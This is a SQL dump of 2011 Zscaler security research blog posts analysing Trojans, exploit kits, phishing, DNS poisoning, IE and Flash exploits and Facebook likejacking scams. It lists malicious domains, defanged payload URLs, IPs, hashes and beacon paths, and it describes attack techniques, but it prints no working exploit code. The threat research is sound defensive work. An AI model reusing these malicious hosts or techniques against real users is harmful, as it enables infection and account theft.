INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (368, 'Blekko Illustrates The Difficulty In Fighting SEO Spam', 'Julien Sobrier', 'August 02, 2011', 'Blekko is the new search engine in the block. It launched in November 2010, raised about $24 million and received a fair bit of press in start-up and tech blogs.    Blekko\'s promise is to provide high quality search results. They work on a smaller index of around 3 billion pages (~46 billions for Google). Blekko emphasizes the fact that they eliminate spam, malware and content farms from their results. This statement is displayed prominently on their  home page.         	  		  			  		  		  			Blekko\'s home page  		  	        I\'ve blogged a great deal about how spam SEO infects the most popular searches. This is a real problem on Google. So I was very curious to know how a search engine focused on the quality of its search results and committed to remove spam, would do.    Buying software online, currently account for the majority of SEO spam. Google search results are mostly (up to 90% or more on the first 10 results pages) a list of hijacked sites, usually university websites, redirecting to fake stores. The spam pages shown to the search engine indexer look the same and the fake stores themselves are very similar as well.    After investigating, I\'m afraid that our results show Blekko doing no better than Google when it comes to filtering out spam. For example, a search for \"Buy Windows 7 key\" returns mostly spam:      	first page:; 7 out of the 10 links are spam redirecting to another domain, including 4 .edu hijacked sites        	  		  			  		  		  			Spam results on the first page  		  	           	2nd result page: 8 spam links, but one good link to this blog about malicious fake stores!      Still under the radar    Luckily for Blekko users, spammers are not (yet?) interested in them. The spam pages look at the Referer header, among other things, to differentiate between real users and bots (security tools, search engine indexers, etc.). Most of the spam pages redirect users to the malicious sites only if they come from a Google, Bing or Yahoo! search. Users coming from Blekko see the spam page only.         	  		  			  		  		  			Spam page on Universitiy website  		  	      All the search engines are having trouble eliminating spam. Blekko appears to be focused on identifying content farms, which usually contain harmless spam, rather than hijacked sites that lead to malicious domains (fake store, fake Antivirus, etc.)      You can protect yourself against malicious spam SEO with the Zscaler Safe Shopping and Search Engine Security plugins.    -- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/blekko-illustrates-difficulty-fighting-seo-spam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (369, 'Current Trojan Ambler Activity', 'ThreatLabz', 'July 28, 2011', 'Update with sinkhole results:    About 24 hrs later from registering the one Trojan Ambler .net domain mentioned below and monitoring the sinkhole, I only saw about a dozen infected unique client IPs \"correctly\" check-in. I did see a few other transactions, but the user-agent and behavior made it obvious that these weren\'t infections but were from other researchers stopping by (e.g., TrendMicro and Google). Not a huge botnet at all - it was interesting to see that all of the infections were from Australian hosts (iinet.net.au, exetel.com.au, tpgi.com.au, internode.com.au, telstra.net). It is interesting that this particular threat seems isolated to one particular region.                  Original Post:    During the course of analysis to try to identify some interesting beaconing behaviors, I noticed some “low” and “slow” activity tied to a malware threat that didn’t have a whole lot of information documented in one place. I’ll try to tie it all together in this post. The beaconing activity is “low” in that very little network activity takes place (generally, saw a 108 byte request and only 260 bytes of response data), and “slow” in that the beacons are not very frequent or regular (though this may have to do with the uptime of the victim too). For example, I saw an exact 3-hour beacon followed by another over 15 hours later.    In the activity observed, I saw the requests going to:    aunznewl1.com, resolving to 199.71.212.157  aunznewl1.net, did not resolve    Note: It appears in most instances of the malware it tries to beacon to a .com / .net domain pair – but in the cases that I’ve seen only the .com is actually registered. I went ahead and registered the above .net domain and will monitor and update this post with any data I find.    URL paths:    /newuser.php  /comm.php?userid=XXXXXXXX_XXXXXX    Note: the user id appears to be a historical timestamp (DDMMYYYY_HHMMSS) from 2011, possibly related to the time of infection. The above two URL paths are quick and easy ways of identifying infections in your network – I didn’t see these patterns in EmergingThreats.    Doing Google searches for the above two domains does not reveal much of anything. However, there is some open-source information that can be pulled-in to tie this to an identified malware family:    To start with, there is a “Trojan.Win32.Generic” GFI Sandbox report that identifies HTTP beaconing to the domain pair thausyn2.com and thausyn2.net on the same IP above. Using the MD5 from this report, we can pull a VirusTotal report which shows it to be detected as a Trojan by 19/41 A/V vendors. Doing a bit more digging shows a few additional reports, for example a Malware-Control report from late June 2011 showing that the malware family is frequently classified as “Ambler” or “Amber” Trojan Spy variant – which can steal passwords and log key-strokes. This is an older malware family, and appears to have some ties to Russia. While it is an older malware family, this current variant shows that it is still in use and exhibits some different patterns possibly allowing infections to fly under the radar.    I downloaded a very recent version of malware from one of the involved domains, and it has very poor A/V detection:  MD5: 2936b54a55615ae85f585c3c6dc1f81b  V/T report: 4/43  The binary itself ends the file with a series of “PADDINGPADDINGXX” strings … which a quick Google shows some malware reports from Anubis. It appears to be an IRCbot used to further download other malware, such as the Ambler Trojan.    Combining open-source reports along with some DNS information provides this list of suspected domain infrastructure used to support this campaign:    aunznewl.com  aunznewl1.com  aunznewl2.com  aunznewl3.com  aunznewl4.com  thausyn.com  thausyn1.com  thausyn2.com  thausyn3.com  thaunzsyn.com  synworkd.com  dogaure.info  dogaure.com  dogaure.net  jokesd33.com  tredoz.com  bart165.info  lim5ff.com  buychau1.com  lakydogau.com    Note: some of the \"older\" domains used now appear to be re-purposed, for example:  jokesd33.com appears to be a possible work from home / mule scam.', 'Malware', 'https://www.zscaler.com/blogs/research/current-trojan-ambler-activity');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (370, 'Malware Distribution Using Fake YouTube Pages', 'ThreatLabz', 'July 26, 2011', 'Attackers often create fake YouTube pages in an effort to lure a victim into downloading malicious binaries. During our research, we recently found an example of such a site. When a victim visits the page, a security warning will pop up saying “The application’s digital signature cannot be verified. Do you want to run the application?”. Should a victim accept the prompts, they will download and run a malicious binary on their system. Here is a screenshot of the page:             The page is designed to mimic the YouTube service. If however you inspect the source code of this page, you can identify the malicious binary behind this attack. Here is what the source code looks like:                  The webpage includes a Java applet that runs a “YouTube.jar” file, which will then download “ser.exe” from the server. If you visit the homepage of above site, you will also see a separate Java applet being combined with VBScript to download and run the same malicious binary with a slightly different name “serv.exe”, which will later saved as “update.exe”. Here is screenshot of that script:                  While the malicious files are currently detected by some antivirus products, the malicious website is not blocked by Google Safe Browsing. It is never advisable to download or run any executable from an untrusted source unfortunately, this relatively simple social engineering technique clearly still works.                   Umesh', 'Phishing', 'https://www.zscaler.com/blogs/research/malware-distribution-using-fake-youtube-pages');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (371, 'Zscaler Safe Shopping For Safari', 'Julien Sobrier', 'July 25, 2011', 'After Firefox, Firefox Mobile, Opera and Google Chrome, Zscaler Safe Shopping is now available for Safari. You can download it from our website. The features are the same as the other platforms - a warning is displayed when the user is visiting a compromised or fake online store.       	  		  			  		  		  			Zscaler Safe Shopping warning in Safari  		  	    Safari extensions follow the same process as Opera and Google Chrome. Safari includes an extension builder that make easy to create the extension, package it and test it. The documentation for developers is quite good.    However, the submission process is completely obscure. I submitted the plugin over four weeks ago and I have no idea what Apple did with it. I don\'t have any reference number or any way to track it. This may explain why this is the only browser with a 3rd party website dedicated to browser extensions at http://safariextensions.org/. I plan to submit Zscaler Safe Shopping to this site shortly.        Install Zscaler Safe Shopping for Safari       	  		  			  		  		  			Zscaler Safe Shopping for Safari installed  		  	      Here is a video showing the extension in action:            -- Julien', 'Malware;Phishing', 'https://www.zscaler.com/blogs/research/zscaler-safe-shopping-safari');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (372, 'Manually De-obfuscating Malicious Content', 'ThreatLabz', 'July 21, 2011', 'Most of the time, malicious obfuscated JavaScript is injected at the bottom of a webpage. Obfuscation is leveraged both to hide the true purpose of the code from prying human eyes and in an attempt to bypass security scans. As a researcher, you may have to conduct a manual analysis of such JavaScript, if certain automated tools like Malzilla fail to decode the obfuscated content. Let’s take a look at an example of one infected Indian university website. Here is the home page of the infected website:                  The malicious obfuscated JavaScript is injected right after the closing HTML tag. Here is the screenshot of injected malicious code:                  The above malicious JavaScript is heavily obfuscated and it’s hard to determine what it is trying to do, just from a manual inspection. Most of the time, the obfuscated code contains links to malicious websites hosting malware. Let’s complete a manual analysis of this malicious content to identify any links to malicious sites. To conduct a manual analysis, you need to understand JavaScript and basic HTML. Let’s format this code for better reading. You can find the formatted code here.         As you can see, the code still appears heavily obfuscated with numerous variables defined. You will also notice some JavaScript functions like “.substr”, “document.body.appendChild” which are commonly found in malicious code. Many of the variables defined receive a return value from function “D()” such as:                  D() is clearly an interesting function, so we’ll begin there. We can see that function “D()” takes two parameters and returns a value. Let’s quickly find the “D()” function and look into the code. Here is what function “D()” looks like:                  So function “D()” will do some string operations on the passed in parameters. We can now copy and paste this function and copy the variables, which use this function into a new HTML file called “test.html”. The goal is to identify return values from this function. For this function to work, we also need two variables, “Y” and “v”, which are used inside this function. These variables are available from the main script. Copy and paste those variables into the D() function. Now, we will call another JavaScript function called “alert()” to display the return value. Open the new “test.html” file we created in Internet explorer. The JavaScript function “alert()” will pop up the message box displaying the return value, as shown below:                  Insert all of the variables, which use this function and read out all the strings returned by this function. Here is what our new “test.html” file looks like:                  I have already added the strings returned by this function in the code comments. The above malicious code points to the malicious website “hxxp://linkbucks-com.37wan.com.tagged-com.BestBlenderPart.ru:8080/wsj.com/wsj.com/ibibo.com/google.com/xvideos.com.php”.    Umesh', 'Analysis', 'https://www.zscaler.com/blogs/research/manually-de-obfuscating-malicious-content');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (373, 'Brazilian Bank Targeted By Phishing Site And DNS Poisoning', 'Julien Sobrier', 'July 18, 2011', 'Update 7/26: See post on our Scrapbook blog about details surrounding a recently poisoned BR nameserver involved in this fraud. -- Mike         Santander, a well-known banking site, has often been the target of phishers. In fact, Santander UK often makes the top-10 list of most popular targets according to Phishtank. Last week, we found a phishing site for the Brazilian branch, santander.com.br, that was receiving traffic from a DNS cache poisoning attack.    The phishing site hosted on 200.252.58.134 looks identical to the original site. The attackers have replicated the entire login process in order to gather the login, password, and security code of the bank users.                	  		  			  		  		  			Santander Brazil phishing site  		  	                       	  		  			  		  		  			Original Santander Brazil home page  		  	        The DNS poisoning made this attack much more effective. The hijacked DNS servers were resolving santander.com.br to 200.252.58.134 (phishing site) instead of 200.220.178.3 or 200.220.186.3 (legitimate sites). In such a situation, phsishers do not need to blast e-mails to random Brazilian e-mail accounts. They just need to wait for the Santander customers to login into their bank account, when accessing the site via the poisoned DNS servers.    DNS poisoning also renders virtually all browser phishing defenses useless. Google Safe Browsing (Firefox, Safari, Chrome, etc.) and Phishtank (Opera, etc.) both rely on a blacklist, which is a list of URLs or domains to block. It can be very hard for the user to realize that this is a phishing site because it looks exactly like the real site, and the URL shows the correct domain.    In this attack, there were only 2 oddities that an advanced users could spot. First, the phishing site did not support HTTPS traffic. Advanced users should know that credentials should be sent over secure HTTPS sessions only and banking sites always redirect to HTTPS enabled pages when the user must log in. The second clue is in the source of the page: the last line, an HTML comment, shows that the page was copied from the original site:                     	  		  			  		  		  			Last few liens of the HTML code of the phishing site  		  	        A week later, the phishing site is still up. it is not blocked by Phishtank or Google Safe Browsing. However, the hijacked DNS servers have been cleaned up, making this site a lot less dangerous.      -- Julien', 'Uncategorised', 'https://www.zscaler.com/blogs/research/brazilian-bank-targeted-phishing-site-and-dns-poisoning');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (374, 'Obfuscated Exploits Continue To Target CVE-2010-0806 And CVE-2010-3962', 'ThreatLabz', 'July 14, 2011', 'A pair of “use-after-free” aka “uninitialized memory corruption” vulnerabilities (CVE-2010-0806 and CVE-2010-3962) in Internet Explorer were reported in November 2010 and remain among the favored client-side attack vectors currently seen in the wild. Recently during my research, I have noticed a gradual increase in attacks targeting these vulnerabilities. Often these two vulnerabilities are combined into a single exploit, as both the vulnerabilities target Internet Explorer 6 and 7. Combining exploit code will of course increase the probability of a successful attack.         Lets analyze one sample that I came across recently.    Source code    hxxp://www.dxcdfghg.com/2.html            hxxp://www.dxcdfghg.com/2.js        De-obfuscated Code Analysis    De-obfuscation of the above code, shows how the exploitation of the two vulnerabilities is carried out. Lets go through each one of them sequentially.    Both exploits work in following way      	  	Initiate a heap spray  	  	  	Exploit causes a use-after-free error  	  	  	Assembly code running at the time of the “use-after-free error” causes the CPU to execute shellcode thanks to the heap spray.  	      Version check – This is required to initialize the address of the shellcode. The full address is computed when heap spray is carried out.        Shellcode - Common for both the vulnerabilities.        The heap spray is carried out by different functions for the different vulnerabilities.    Exploiting CVE-2010-0806         Exploiting CVE-2010-3962        Other samples that target these vulnerabilities, which I observed during my research varies in terms of the way the Javascript code is obfuscated. However, the overall process remains the same. This again tells us why it’s important to update your browser with latest security patches.    Further research on the domain “dxcdfghg.com” reveals that the IP address bound to this domain has hosted various other malicous domains carrying out alternate attacks.        Hosting multiple malicious domains on one IP address is common practice for attackers.    Pradeep', 'Exploit', 'https://www.zscaler.com/blogs/research/obfuscated-exploits-continue-target-cve-2010-0806-and-cve-2010-3962');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (375, 'IRS, NACHA, Etc. Mal-spam', 'ThreatLabz', 'June 29, 2011', 'I posted a few of these mal-spam incidents on our Scrapbook blog ... this sort of mal-spam has been on-going, but there has been a recent uptick since early June. The NACHA, Federal Reserve, and now IRS mal-spam sites have all favored the MelbourneIT/Yahoo netblocks/domain services.         This is one of those cases of using Uncle-Sam, which relates to any US citizen, for social engineering spam recipients into falling victim to an attack.         Recently the straight up spam-to-malicious URL exe scenario changed to a more complex multi-stage, multi-pronged attack scenario: spam to URL shortener which redirects to another URL shortener and/or site containing an exploit kit (Blackhole) and drop or social network to malicious Zeus-ish malicious executable to sites like:         hxxp:// irs-report.com/TAX6538001.pdf.exe         Fortunately, the IRS and security researchers alike were all over this to have these sites removed as quickly as possible. Regardless the spam was widespread through the Cutwail/Pushdo botnet and impacted a lot of Internet users. Here are a few of the details (posted with permission from co-handler of this incident)...         Here is an example of one of the shorteners:    hxxp://shortn.me/iACt         Here is an example of one of the second-stage shorteners:    hxxp://ur.ly/MJu0         All-in-all a handful of shortener services were abused for this campaign to the tune of thousands of shortened URLs (perhaps a different shortened URL per spam message to avoid detection from groups like SURBL). Some of the services abused include: 3cm.kz, bizz.cc, linkzip.net, omf.gd, ptiturl.com, tiny.tw, 0845.com as well as the previously mentioned shortn.me and ur.ly services.         From my example, the second-stage shortener linked to content that was pretty well obfuscated ... it \"abused\" JavaScript (such that my command-line interpreter, CLI, couldn\'t render) and it also did the standard leveraging of HTML DOM objects: specifically through, getElementsByTagName, innerHTML, as well as some creative uses of document creation with createTextNode, appendChild, and related. Because of these, it made the second-stage redirect a bit challenging to deobfuscate ... in the end, it helped to modify the script to suite what my CLI JS could understand. All of the obfuscated content was numbers within HTML div tags that was looped through with this (modified) JS:          Deobfuscating the content, returns the exploit scripts as well as redirects to the previously mentioned irs-report site.        Example drop:    MD5 : 8a5bf0dd71a1b8ea8155963b252e2105  V/T report: 13/42 now (seen <6 detects in some cases)           Remember the IRS does not contact the taxpayer through email! (reference)', 'Malware;Phishing', 'https://www.zscaler.com/blogs/research/irs-nacha-etc-mal-spam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (376, 'Patching Flash - CVE-2011-2110 Post-mortem', 'ThreatLabz', 'June 21, 2011', 'Last week I blogged about the CVE-2011-2110 Adobe Flash vulnerability being actively exploited in the wild.  Adobe released its patch exactly a week ago (Tuesday, June 14) ... I wanted to do a follow up to identify the patch rate within our enterprise customers.Within our last \"State of the Web\" quarterly report - we identified that only 4.5% of our customers running Flash were running an outdated, vulnerable version.  (Java was the most out of date with 51.32% - good reason why this has become a favorite client-side application for attackers to exploit).  Running the numbers for the week prior to and the week following the patch shows:Week prior to CVE-2011-2110 patch:About 93.43% of clients accessing the web through our cloud during this period had Flash installed.  Of the clients that had Flash installed, 7.88% were running an out of date / vulnerable version.Week following CVE-2011-2110 patch:About 94.19% of the clients accessing the web through our cloud during this period had Flash installed.  Of the clients that had Flash installed, 10.15% were running an out of date / vulnerable version - about a 28.81% percentage increase of vulnerable Flash instances.  The overall vulnerable percentage rate is also more than double the rate that we noticed for Q1 2011 - showing that client-side application patching within the enterprise remains a problem.  This is in spite of Adobe\'s auto-updating feature - which still requires action from the weakest-link (the user). \"Windows users and users of Adobe Flash Player 10.3.181.16 or later for  Macintosh can install the update via the auto-update mechanism within  the product when prompted.\"', 'Uncategorised', 'https://www.zscaler.com/blogs/research/patching-flash-cve-2011-2110-post-mortem');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (377, 'Zscaler Safe Shopping Available For Opera', 'Julien Sobrier', 'June 20, 2011', 'Zscaler Safe Shopping is already available for Firefox, Firefox Mobile (aka Fennec) and Google Chrome. Now, you can also download the extension for your Opera 11 browser. A version for Safari will be available soon as well.       	  		  			  		  		  			Zscaler Safe Shopping extension for Opera  		  	        For those not familiar with the extensions, Zscaler Safe Shopping shows a warning when users visit fake or compromised online stores. You can refer to previous posts for further details. You can also find other security extensions and tools from Zscaler on our Research Tools page.       	  		  			  		  		  			Zscaler Safe Shopping warning for a fake store  		  	        You can download the extension on the official Opera Extensions site.    Extension creation    Building an extension for Google Chrome, Opera and Safari is very similar. The Zscaler Safe Shopping source code for these three browsers is about 90% identical. The differences are due primarily to the way that extensions are packaged, in oder to be distributed and in the way that scripts communicate between the browser and the page.    Basically, Zscaler Safe Shopping for these three browsers is separated into two parts:    	The background process which is used to download the blacklist, to do the domain matching and to handle options  	A script injected on each page/frame to interact with the HTML document: get the page URL, insert a warning, etc.    The page script and the background process can communicate together. The background process has access to the browser as a whole (UI, API, etc.), but not to the tab content. The injected script has access to content on individual tabs. Both scripts can communicate with one another to give the extension full access to the page and browser.    Extension approval    If you want to write your first add-on, Google Chrome is probably the easiest browser to start with. It has good documentation, good tools to test with and package extensions. Google is also the only vendor that does not require any approval to publish extensions to their official store. This is nice for the developers, but users could end up installing unstable, incomplete or dangerous plug-ins. All other vendors require a manual review.       	  		  			  		  		  			Zscaler Safe Shopping approved on the Opera Extensions site  		  	      Opera reviewed our plugin within 24 hours. Firefox took several weeks (the extension is actually not approved yet), but the review process seems much more thorough than the other vendors. This might be due to the fact that their plug-in framework is much more powerful than the other browsers, allowing developers to potentially do a a lot more harm to the security of their entire computer.    The approval for Safari seems to be very opaque. I submitted the plugin more than a week ago and haven\'t yet received an update. The publishing process is also somewhat strange. For example, they force the developers to host their add-on on their own website. There is no option to upload the extension directly to an Apple owned site.    -- Julien', 'Tools', 'https://www.zscaler.com/blogs/research/zscaler-safe-shopping-available-opera');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (378, 'The \"Dad Walks In On Daughter.. EMBARRASSING!\" Facebook Scams', 'Julien Sobrier', 'June 17, 2011', 'The \"Dad walks in on Daughter.. EMBARRASSING!\" Facebook scams have become very prevalent. I listed a few examples on our new blog, Zscaler Analyst Scrapbook. I\'ll go into more detail in this post.    A Google search for \"Dad walks in on Daughter.. EMBARRASSING!\" shows hundreds of spam pages. They are mostly new domains, set up just for the purpose of scamming users.       	  		  			  		  		  			Google search shows spam pages  		  	      Some of the domains identified are:    	the-ping.org  	t401.org  	ectoplax.info  	20yearstimephoto.info  	20yearsphoto.info       Links can also be found by searching directly on Facebook:      	apps.facebook.com/cooljoysole/  	apps.facebook.com/dadwalksin/  	apps.facebook.com/fgdfhgdfgdf/    	www.facebook.com/pages/Dad-walks-in-on-Daughter-Embarrassing/217239648303953    Facebook users should remember that Facebook applications are not necessary reviewed by the Facebook staff, and can be harmful.    Besides being wide spread, this spam is interesting because it shows the wide variety of scams and spam associated with Facebook. Here are a few.    Like-Jacking    A very common technique used with Facebook spam involves likejacking. The spammer entices users to click on a link or image, often on the premise of watching a funny video. However, the page contains a hidden Like button that is unknowingly triggered by the user. The Like button is placed in a hidden iFrame or hidden DIV tag that follows the mouse.    This technique is used to spread the spam page via Facebook profiles to get more users to visit the page. This likejacking technique can be found, for example, on gadgetera.net or t401.org.       	  		  			  		  		  			Fake video layer hiding a Like button  		  	      On these pages, the likejacking technique used is somewhat unique: 23 Like Buttons are placed in the center of the video, below what looks like the play button. The opacity is set to 0, meaning these buttons are totally transparent and cannot be seen. When a user believes he is clicking on the play button, he is actually clicking on one of the like buttons.       	  		  			  		  		  			Like buttons rendered visible  		  	      You can check the details in this video:           Script injection    This second example is much more harmful. The attackers ask users to copy and paste Javascript code into their Browser URL bar. The Javavascript has full access to contents in the open browser tab. It can grab the user session cookie and send it to the attacker. This gives the attacker full access to and control of your Facebook account.       	  		  			  		  		  			Script injection  		  	    In the example, the attackers didn\'t try very hard to hide their intentions. They load the malicious Javascript from a page called owned.php!    These types of script injection used to be done through cross-site scripting (XSS), or other vulnerabilities. Now unfortunately, attackers are finding that they can bypass security protections as users are willing to do anything, including willingly executing malicious code!    Comment-Jacking    Instead of using a Like button to spread a page, spammers can also use comments. On hxxp://kingsoz.org/, the user is asked to enter a captcha to access the video. The result is actually entered into a Facebook comment box (you can see the \"comment\" button).       	  		  			  		  		  			User asked for a Captcha  		  	    Similar to the \"Like\" button, this adds content to the victim\'s Facebook profile and shows up in his friend\'s News page.       	  		  			  		  		  			Spam link on my user profile after visiting hxxp://kingsoz.org/  		  	      Survey, Software Installation    Getting the spam page hosted in a victim\'s Facebook profile is only the first step for a scammer. Ultimately, they want to make a few bucks from each visitor. A common technique used involves asking visitors to fill out a survey, install software, or to click on advertising to verify that they are in fact a human and not an automated script. The spammers get paid for each action.             After getting 5 spam pages added to my profile, filling out 3 surveys and getting my Facebook account stolen, I was still not able to watch this video :-)    -- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/dad-walks-daughter-embarrassing-facebook-scams');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (379, 'Oh Flash! CVE-2011-2110 0-Day', 'ThreatLabz', 'June 17, 2011', 'This past Tuesday, June 14, a vulnerability (CVE-2011-2110) in the Adobe Flash Player was patched.  This vulnerability is actively being exploited in the wild - prior to the patch, the earliest exploitation that we have seen in our logs thus far, dates back to early last Thursday (June 9th).Attackers have/are embedding redirects into compromised legitimate websites (including an Indian government site, a US airport site, and an aerospace site, among others).  The redirects direct user\'s web-browsers to access the flash exploit - once the victim machine is exploited it downloads, decodes, and executes malcode.Working with Steven from Shadowserver we were able to collectively share information to benefit the community and a public, detailed report was subsequently released on their website.  Their report lists the sites/servers that we helped identify that have hosted the malicious content, as well as provides guidance for handling this threat.  Among the recommended guidance:Patch! Flash Player older than 10.3.181.26 (or 10.3.181.24 for Android) is vulnerable. You can check your version here.Block the identified malicious servers/pages/binaries - this has already been done for customers using our cloud.Block/monitor for additional sites using the same attack pattern - this has already been done for customers using our cloud.  Shadowserver released a Snort signature in their report to assist with identifying this pattern as well.A special thanks to Steven from Shadowserver.', 'Zero Day', 'https://www.zscaler.com/blogs/research/oh-flash-cve-2011-2110-0-day');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (380, 'PasteHtml.com, A Heaven For Phishing Pages', 'Julien Sobrier', 'June 15, 2011', 'Phishers, scammers and other attackers love free hosting services. They constantly need to set up plenty of malicious sites as their old ones are taken down or blacklisted. Fake AV authors loved co.cc, a free DNS service that allows them to redirect users to sites such as flashupdate.co.cc. They then used a similar service from cz.cc, etc. . .co.tv was used to redirect users to malware. Free hosting service Ripway is still full of phishing sites.The ultimate dream of a phisher it to be able to set up thousands of phishing sites freely, anonymously, and quickly. Luckily for them, PasteHtml.com offers a service which empowers them to do just that. It is a \"Free anonymous web hosting\" site, which allows anyone to create any page with a simple POST request.PasteHtml.com home pageTo be clear, like many other free services, PasteHtml was not designed to host malicious content. They have many legitimate pages, but they are also used to host many Phishing pages. Try searches on the site for terms such as \"site:pastehtml.com facebook login\" or \"site:pastehtml.com paypal\", Most of the pages are malicious.PasteHtml seems to take phishing seriously. A lot of these phishing pages were taken down, and warnings are shown for potentially dangerous pages (see hxxp://pastehtml.com/view/1b3tqp1.html).Warning from PasteHtmlHere are a some of the phishing/spam/scam pages I\'ve found that are not (yet) blocked:Facebook: hxxp://pastehtml.com/view/awq68wgzy.html (update: now blocked) Zynga: hxxp://pastehtml.com/view/1ehc16p.htmlPharma spam: hxxp://pastehtml.com/view/1d7xdbx.html (there are many similar pages)Facebook phishing pageIt is so easy, and so quick, to create new malicious pages using services such as PasteHtml, that even their intentions may be good, they are bound to be vastly abused.-- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/pastehtmlcom-heaven-phishing-pages');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (381, 'Incognito Exploit Kit', 'ThreatLabz', 'June 14, 2011', 'Exploit kits are becoming an increasingly popular means of spreading attacks. Umesh recently blogged about seeing a spike in the usage of the Blackhole exploit kit. This exploit kit targets multiple known vulnerabilities present in a victim\'s browser, increasing the probability of a successful compromise. Various exploit kits differ in the way they are packaged, designed and implemented. The most distinguishing factor among different exploit kits is how exploits are obfuscated, in order to bypass various security controls.    Recently, I have noticed a significant increase in the usage of the Incognito exploit kit. Similar to the Blackhole exploit kit, Incognito also targets vulnerabilities in Java and Adobe products. Another item that stands out to differentiate among these exploit kits is the URL patterns used. Most of the time, the URL pattern remains same within a given exploit kit. A quick look at malwaredomainlist shows the usage of common patterns used in URLs associated with Incognito.    Common URL patterns for Incognito:        Code obfuscation (Formatted for good view),                 De-obfuscation of the aforementioned JavaScript, shows the exploit kit carrying out different attack vectors. Let’s analyze different pieces of the de-obfuscated code.    Object Initializations and other functions,                  Iframe Injection:             Google safe browsing reports this URL to be malicious. Visiting the above link redirects you to fake search portal delivering ads hxxp://searchportal.information.com/?o_id=164060&domainname=register-domain-names.info.              Step 0: This is the entry point of the malicious code. It completes required initializations of objects for vulnerable ActiveX controls. Upon the successful creation of objects, it launches the first attack vector by calling function \'gr\', which injects a malicious file. The code then moves on to Step 1.             Vulnerability Details:  CVE : CVE-2006-4704  Name : Microsoft Visual Studio 2005 WMI Object Broker Remote Code Execution Vulnerability    My previous blog post describes a different version of obfuscated JavaScript targeting this vulnerability.    Step 1 : This code targets the “Java Deployment Toolkit”.               Vulnerability Details:  CVE : CVE-2010-1423  Name : Java Deployment Toolkit insufficient argument validation         Step 2 : This creates Iframe tags for malicious PDFs.                       This example illustrates how the multi-level attacks targeted by exploit kits are becoming a favored choice of attackers these days. More importantly, the creation of automated tools to deliver these exploits, provides attackers with the opportunity to launch campaigns on a frequent basis, with limited technical knowledge.    Pradeep', 'Exploit;Exploit Kit;Vulnerability', 'https://www.zscaler.com/blogs/research/incognito-exploit-kit');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (382, '.co.tv Domains Serving Heavily Obfuscated Malicious Code', 'ThreatLabz', 'June 11, 2011', 'Following a previous post on a malicious Google News search, we identified additional domains related to this attack, also serving malicious code. The method of infection remains the same by injecting a malicious script, which will redirect victims to one of several malicious domains. You will only be redirected to the malicious domains if certain conditions are met, such as a match on the referrer string in the HTTP header. For most domains, the attack requires that the Referrer be  www.Google.com. Here is what the obfuscated malicious script looks like:    The malicious script is inserted just ahead of the opening HTML tag and decodes to any of the following domains which will ultimately deliver exploit code after multiple redirections,      okvmodps.co.tv  qbzaqmse.co.tv  jujbytqe.co.tv  ccjayplh.co.tv  sbzjrszn.co.tv  zarqqasx.co.tv  pboysxaj.co.tv  ecxajgff.co.tv  wkydwlkk.co.tv  bqhfvvdn.co.tv  cbneehtm.co.tv  xfrfrwjd.co.tv  neddhilr.co.tv  dzedshuw.co.tv  zhkeinzr.co.tv  rblvsbht.co.tv  itzqmiip.co.tv  mzpupkqo.co.tv  fkejoten.co.tv  rowxhoai.co.tv  eddddbzm.co.tv  bhbdzmjy.co.tv  xnnblhid.co.tv  zzxfyrru.co.tv  hocxhnrl.co.tv  rvcxwsmt.co.tv  wkrfgzoc.co.tv    All above mentioned domains are hosted on the same IP address (64.191.81.117).Here is whois information for the IP:    Umesh', 'Malware', 'https://www.zscaler.com/blogs/research/cotv-domains-serving-heavily-obfuscated-malicious-code');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (383, 'Zscaler Analyst Scrapbook', 'ThreatLabz', 'June 10, 2011', 'Introducing our sister blog: Zscaler Analyst ScrapbookVery often while we\'re conducting log analysis across our cloud in order to add security protections (signatures, black listing, reputation scoring, etc.) we find interesting scraps of information.  While this information may not be interesting to the masses - it may help those working in security operations centers (SOCs) or other roles to add similar protections for their users.research.zscaler.com will remain our primary blog with polished posts focused on security research and \"new\" threats, while the scrapbook.zscaler.com blog will be reserved for quick mini-posts, focusing on things that we uncover during our daily data mining and analytics. The hope is that by sharing this additional information, others in the security community can use this information to better protect themselves and their users. We encourage feedback from our readers on work that they may be doing on similar topics so that we can publicly collaborate on emerging threats. Welcome!Visit Zscaler\'s Analyst Scrapbook', 'Analysis', 'https://www.zscaler.com/blogs/research/zscaler-analyst-scrapbook');
